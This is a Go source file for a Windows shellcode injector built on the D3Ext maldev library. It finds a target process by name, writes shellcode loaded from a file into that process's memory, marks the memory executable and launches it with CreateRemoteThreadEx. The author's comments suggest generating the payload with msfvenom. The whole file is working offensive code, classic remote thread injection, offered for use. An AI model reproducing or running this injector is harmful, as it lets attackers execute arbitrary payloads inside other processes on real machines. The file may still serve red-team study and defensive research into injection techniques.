package main

import (
	"flag"
	"fmt"
	"os"
	"unsafe"

	"github.com/D3Ext/maldev/process"
	"github.com/D3Ext/maldev/shellcode"
	"golang.org/x/sys/windows"
)

var (
	kernel32DLL              = windows.NewLazyDLL("kernel32.dll")
	GetCurrentProcess        = kernel32DLL.NewProc("GetCurrentProcess")
	procOpenProcess          = kernel32DLL.NewProc("OpenProcess")
	procVirtualAllocEx       = kernel32DLL.NewProc("VirtualAllocEx")
	procVirtualProtectEx     = kernel32DLL.NewProc("VirtualProtectEx")
	procWriteProcessMemory   = kernel32DLL.NewProc("WriteProcessMemory")
	procCreateRemoteThreadEx = kernel32DLL.NewProc("CreateRemoteThreadEx")
	procCloseHandle          = kernel32DLL.NewProc("CloseHandle")
	//procOpenProcess          = kernel32DLL.NewProc("OpenProcess") //Not necessary since we obtain our PID from mald3v
	//procCloseHandle 		   = kernel32DLL.NewProc("CloseHandle")
)

func injectThread(shellcode []byte, PID int) { //Classic Thread Injection
	var pHandle uintptr
	sizeOfShellcode := len(shellcode)
	if PID == 0 {
		pHandle, _, _ = GetCurrentProcess.Call()
	} else { //I ran into a brainfart where I was passing the PID into VirtualAllocEx instead of the pHandle. Be careful
		pHandle, _, _ = procOpenProcess.Call(
			windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
			uintptr(0),
			uintptr(PID))
	}
	//procVirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(sizeOfShellcode), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE) This is correct but for syntax and readability we do the below
	addr, _, _ := procVirtualAllocEx.Call(
		uintptr(pHandle),
		0,
		uintptr(sizeOfShellcode),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)
	if addr == 0 {
		fmt.Println("Couldnt allocate the memmory")
		os.Exit(-1)
	}

	procWriteProcessMemory.Call(
		uintptr(pHandle),
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(sizeOfShellcode))

	oldProtect := windows.PAGE_READWRITE
	procVirtualProtectEx.Call(
		uintptr(pHandle),
		addr,
		uintptr(sizeOfShellcode),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)))

	procCreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0) //We can create the thread in suspended mode and then resume exec. Ouuuuhh
	_, _, errCloseHandle := procCloseHandle.Call(uintptr(pHandle))
	if errCloseHandle != nil {
		fmt.Println("Error Closing Handle")
		os.Exit(-1)
	}
}

// Generate the shellcode with msfvenom. Name it shellcode.bin. Put it in the same dir as this and run
func main() {
	total_args := len(os.Args[1:])
	if total_args != 4 {
		fmt.Println("Usage: injectThread.exe -pN <NameOfInjecteeProcess> -s <shellcode.bin>")
		os.Exit(0)
	}
	var processName string
	var path2shellcode string
	flag.StringVar(&processName, "pN", "EMPTY", "Process2Inject")
	flag.StringVar(&path2shellcode, "s", "EMPTY", "Shellcode2Inject")
	flag.Parse()
	if processName == "EMPTY" {
		os.Exit(0)
	}
	if path2shellcode == "EMPTY" {
		os.Exit(0)
	}
	fmt.Println("Hello World")
	fmt.Println("Grabbing Shellcode from file: " + path2shellcode)
	shellcode, err := shellcode.GetShellcodeFromFile(path2shellcode)
	if err != nil {
		fmt.Println("Could not grab shellcode from the file")
		os.Exit(-1)
	}
	explorerPIDs, err := process.FindPidByName(processName)
	if err != nil {
		fmt.Println("Oops could not find explorer.exe ? Are you sure the process is running ?")
		os.Exit(-1)
	}
	explorerPID := explorerPIDs[0]
	injectThread(shellcode, explorerPID)
	fmt.Printf("Succesfully Executed !")
}
